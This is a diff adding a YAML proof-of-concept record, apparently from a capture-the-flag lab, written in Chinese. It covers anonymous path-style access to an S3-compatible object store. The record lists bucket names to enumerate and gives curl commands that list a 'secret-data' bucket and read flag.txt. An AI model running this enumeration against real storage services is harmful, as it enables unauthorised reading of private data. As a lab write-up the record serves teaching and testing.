@@ -1,0 +1,18 @@
+info:
+  name: s3-path-style-anonymous-access
+  cve: ''
+  summary: S3 兼容对象存储 path-style 匿名访问导致敏感桶内容泄露；枚举桶名后直接读取 flag.txt
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: S3 兼容对象存储 path-style 匿名访问导致敏感桶内容泄露；枚举桶名后直接读取 flag.txt
+  steps:
+  - 1. GET / 首页发现公开桶名 company-assets 及 path-style 说明
+  - 2. 枚举常见敏感桶名 secret-data/secrets/private/internal/admin/confidential
+  - 3. GET /secret-data/ 成功返回 ListBucketResult XML（KeyCount=4）
+  - 4. GET /secret-data/flag.txt 直接返回 flag
+  payload: 'curl http://target:8000/  # 发现桶名; curl http://target:8000/secret-data/
+    # 列目录; curl http://target:8000/secret-data/flag.txt # 读flag'
+  verification: S3 兼容对象存储 path-style 匿名访问导致敏感桶内容泄露；枚举桶名后直接读取 flag.txt
